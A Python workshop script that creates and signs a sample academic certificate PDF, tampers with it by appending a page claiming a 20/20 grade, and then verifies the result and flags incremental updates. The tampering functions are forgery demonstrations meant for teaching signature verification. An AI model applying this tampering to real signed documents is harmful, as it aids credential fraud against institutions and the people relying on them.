#!/usr/bin/env python3
"""
simulate_pdf_signature_attack_refactored.py

A refactored script for a software engineering student workshop on
PDF digital signatures, verification, and attacks.

Usage examples:
  - Create a new PDF: python3 script.py create
  - Sign the created PDF: python3 script.py sign
  - Execute an incremental attack: python3 script.py attack incremental
  - Verify a file: python3 script.py verify outputs/signed.pdf
  - Flatten a PDF: python3 script.py flatten outputs/attacked_incremental_pikepdf.pdf

Requirements:
  pip install endesive cryptography pypdf reportlab fpdf2 pikepdf
"""

import argparse
import logging
import os
import re
import hashlib
import warnings
from datetime import datetime, timezone
from cryptography.utils import CryptographyDeprecationWarning

warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s"
)
log = logging.getLogger(__name__)

# Create outputs directory
OUTPUTS_DIR = "outputs"
if not os.path.exists(OUTPUTS_DIR):
    os.makedirs(OUTPUTS_DIR)
    log.info("✅ Created outputs directory: %s", OUTPUTS_DIR)


# -----------------------
# Core Functions (same as original, but now callable)
# -----------------------

def create_original_pdf(path=None):
    from fpdf import FPDF
    if path is None:
        path = os.path.join(OUTPUTS_DIR, "original.pdf")
    if os.path.exists(path):
        log.info("Original PDF already exists: %s", path)
        return path
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("helvetica", size=16, style="B")
    pdf.cell(0, 10, "Official Academic Certificate", new_x="LMARGIN", new_y="NEXT", align='C')
    pdf.set_font("helvetica", size=12)
    pdf.cell(0, 10, "Name: John Doe", new_x="LMARGIN", new_y="NEXT")
    pdf.cell(0, 10, "Course: Introduction to Cybersecurity", new_x="LMARGIN", new_y="NEXT")
    pdf.cell(0, 10, "Grade: 14/20", new_x="LMARGIN", new_y="NEXT")
    pdf.cell(0, 10, f"Date: {datetime.now().strftime('%Y-%m-%d')}", new_x="LMARGIN", new_y="NEXT")
    pdf.output(path)
    log.info("✅ Original PDF created: %s", path)
    return path

def sign_pdf(pdf_in=None, cert_pem_path="certs/cert.pem", key_pem_path="certs/key.pem", out=None):
    import endesive.pdf.cms as cms
    from cryptography.hazmat.backends import default_backend
    from cryptography.x509 import load_pem_x509_certificate
    from cryptography.hazmat.primitives.serialization import load_pem_private_key
    if pdf_in is None:
        pdf_in = os.path.join(OUTPUTS_DIR, "original.pdf")
    if out is None:
        out = os.path.join(OUTPUTS_DIR, "signed.pdf")
    with open(cert_pem_path, "rb") as f:
        cert_pem = f.read()
    with open(key_pem_path, "rb") as f:
        key_pem = f.read()
    cert_obj = load_pem_x509_certificate(cert_pem, default_backend())
    priv_key_obj = load_pem_private_key(key_pem, password=None, backend=default_backend())
    with open(pdf_in, "rb") as f:
        data = f.read()
    date = datetime.now(timezone.utc).strftime("D:%Y%m%d%H%M%S+00'00'")
    dct = {
        "sigpage": 0,
        "sigfield": "Signature1",
        "auto_sigfield": True,
        "signature": "Digital Signature - Secure University",
        "contact": "security@university.edu",
        "location": "Lima, Peru",
        "signingdate": date,
        "reason": "Officially issued certificate",
    }
    try:
        signed = cms.sign(datau=data, udct=dct, key=priv_key_obj, cert=cert_obj, othercerts=[cert_obj], algomd="sha256")
    except TypeError:
        log.info("Retrying sign(...) using 'dct' instead of 'udct'")
        signed = cms.sign(datau=data, dct=dct, key=priv_key_obj, cert=cert_obj, othercerts=[cert_obj], algomd="sha256")
    out_bytes = signed if signed.startswith(b"%PDF") else data + signed
    with open(out, "wb") as f:
        f.write(out_bytes)
    log.info("✅ Signed PDF saved: %s", out)
    return out

def incremental_rewrite_attack(signed_pdf=None, out=None):
    from pypdf import PdfReader, PdfWriter
    from reportlab.pdfgen import canvas
    from reportlab.lib.colors import red
    from io import BytesIO
    if signed_pdf is None:
        signed_pdf = os.path.join(OUTPUTS_DIR, "signed.pdf")
    if out is None:
        out = os.path.join(OUTPUTS_DIR, "attacked_rewrite.pdf")
    reader = PdfReader(signed_pdf)
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    packet = BytesIO()
    can = canvas.Canvas(packet, pagesize=(595, 842))
    can.setFont("Helvetica-Bold", 24)
    can.setFillColor(red)
    can.drawString(50, 700, "GRADE: 20/20 - HONOR PASS")
    can.save()
    packet.seek(0)
    from pypdf import PdfReader as PR
    temp_reader = PR(packet)
    writer.add_page(temp_reader.pages[0])
    with open(out, "wb") as fp:
        writer.write(fp)
    log.warning("🔴 Incremental rewrite attack applied (does NOT preserve signature): %s", out)
    return out

def incremental_pikepdf_attack(signed_pdf=None, out=None):
    import pikepdf
    from reportlab.pdfgen import canvas
    from io import BytesIO
    import tempfile
    if signed_pdf is None:
        signed_pdf = os.path.join(OUTPUTS_DIR, "signed.pdf")
    if out is None:
        out = os.path.join(OUTPUTS_DIR, "attacked_incremental_pikepdf.pdf")
    packet = BytesIO()
    can = canvas.Canvas(packet, pagesize=(595, 842))
    can.setFont("Helvetica-Bold", 24)
    can.drawString(50, 700, "GRADE: 20/20 - HONOR PASS")
    can.save()
    packet.seek(0)
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
    try:
        tmp.write(packet.read())
        tmp.flush()
        tmp.close()
        with pikepdf.open(signed_pdf, allow_overwriting_input=True) as pdf:
            with pikepdf.open(tmp.name) as mal_pdf:
                pdf.pages.extend(mal_pdf.pages)
            pdf.save(out, linearize=False)
        log.warning("🔴 Real incremental attack applied (PikePDF). Output: %s", out)
        return out
    finally:
        try:
            os.unlink(tmp.name)
        except Exception:
            pass

def basic_verification(pdf_path):
    from endesive.pdf.verify import verify
    if not os.path.exists(pdf_path):
        raise FileNotFoundError(f"File not found: {pdf_path}")
    with open(pdf_path, "rb") as f:
        data = f.read()
    try:
        result = verify(data)
        if result:
            print(f"✅ {pdf_path}: signatures detected")
            for idx, r in enumerate(result):
                print(f"  - Signer #{idx+1}: {r.get('signer_name', 'Unknown')}")
                print(f"    Signing Time: {r.get('signing_time', 'N/A')}")
                print(f"    Signature Hash: {r.get('md', 'N/A')}")
        else:
            print(f"⚠️ {pdf_path}: no signatures detected")
    except AssertionError:
        print(f"⚠️ {pdf_path}: contains incremental updates; verification incomplete.")
    except Exception as e:
        print(f"❌ {pdf_path}: verification error: {e}")
    pdf_hash = hashlib.sha256(data).hexdigest()
    print(f"    SHA-256 Hash: {pdf_hash}")
    startxref_count = len(re.findall(b'startxref', data))
    eof_count = len(re.findall(b'%%EOF', data))
    print(f"    startxref: {startxref_count}, %%EOF: {eof_count}")
    if startxref_count > 1 or eof_count > 1:
        print("⚠️ PDF has multiple sections/incremental updates (possible manipulation)")
    else:
        print("✅ PDF seems to have no additional incremental updates")

def apply_flattening_pypdf(input_pdf=None, out=None):
    from pypdf import PdfReader, PdfWriter
    if input_pdf is None:
        input_pdf = os.path.join(OUTPUTS_DIR, "attacked_incremental_pikepdf.pdf")
    if out is None:
        out = os.path.join(OUTPUTS_DIR, "flattened_pypdf.pdf")
    if not os.path.exists(input_pdf):
        raise FileNotFoundError(f"File not found: {input_pdf}")
    reader = PdfReader(input_pdf)
    writer = PdfWriter()
    for p in reader.pages:
        writer.add_page(p)
    with open(out, "wb") as f:
        writer.write(f)
    log.info("🟢 PDF flattened with pypdf: %s", out)
    return out

# -----------------------
# Argument Parser and Main Logic
# -----------------------

def main():
    parser = argparse.ArgumentParser(
        description="Simulate PDF digital signature attacks and verification.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # Command to create a PDF
    parser_create = subparsers.add_parser("create", help="Create an original PDF document.")

    # Command to sign a PDF
    parser_sign = subparsers.add_parser("sign", help="Sign a PDF document.")
    parser_sign.add_argument("--input", default=os.path.join(OUTPUTS_DIR, "original.pdf"),
                             help="Path to the PDF file to sign.")
    parser_sign.add_argument("--output", default=os.path.join(OUTPUTS_DIR, "signed.pdf"),
                             help="Path for the signed output file.")

    # Command to run attacks
    parser_attack = subparsers.add_parser("attack", help="Execute different types of PDF signature attacks.")
    parser_attack.add_argument("type", choices=["rewrite", "incremental"],
                               help="Type of attack to perform: 'rewrite' or 'incremental'.")
    parser_attack.add_argument("--input", default=os.path.join(OUTPUTS_DIR, "signed.pdf"),
                               help="Path to the signed PDF to attack.")

    # Command to verify a PDF
    parser_verify = subparsers.add_parser("verify", help="Verify the integrity and signature of a PDF.")
    parser_verify.add_argument("file", help="Path to the PDF file to verify.")

    # Command to flatten a PDF
    parser_flatten = subparsers.add_parser("flatten", help="Flatten a PDF to remove incremental updates.")
    parser_flatten.add_argument("--input", default=os.path.join(OUTPUTS_DIR, "attacked_incremental_pikepdf.pdf"),
                                help="Path to the PDF to flatten.")

    args = parser.parse_args()

    if args.command == "create":
        create_original_pdf()
    elif args.command == "sign":
        sign_pdf(pdf_in=args.input, out=args.output)
    elif args.command == "attack":
        if args.type == "rewrite":
            incremental_rewrite_attack(signed_pdf=args.input)
        elif args.type == "incremental":
            incremental_pikepdf_attack(signed_pdf=args.input)
    elif args.command == "verify":
        basic_verification(pdf_path=args.file)
    elif args.command == "flatten":
        apply_flattening_pypdf(input_pdf=args.input)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()